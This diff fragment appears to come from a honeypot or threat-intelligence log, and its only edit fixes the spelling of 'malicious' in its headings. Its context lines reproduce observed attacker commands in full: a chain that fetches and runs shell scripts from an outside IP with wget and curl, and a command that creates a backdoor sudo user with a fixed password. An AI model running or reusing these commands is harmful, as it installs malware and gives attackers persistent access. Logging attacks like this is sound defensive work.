@@ -6,11 +6,11 @@ Top 5 IPs for todays date
 114.32.241.52
 198.235.24.115
 
-#malcious payload observed:
+#Malicious payload observed:
 
 Malware download activity: 
 cd /data/local/tmp/;busybox wget http://103.178.229.177/w.sh; sh w.sh; curl http://103.178.229.177/c.sh; sh c.sh; wget http://103.178.229.177/wget.sh; sh wget.sh; curl http://103.178.229.177/wget.sh; sh wget.sh; busybox wget http://103.178.229.177/wget.sh; sh wget.sh; busybox curl http://103.178.229.177/wget.sh; sh wget.sh
 
-List of malcious commands : 
+List of Malicious commands : 
 
 apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 C7cQn2B3) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
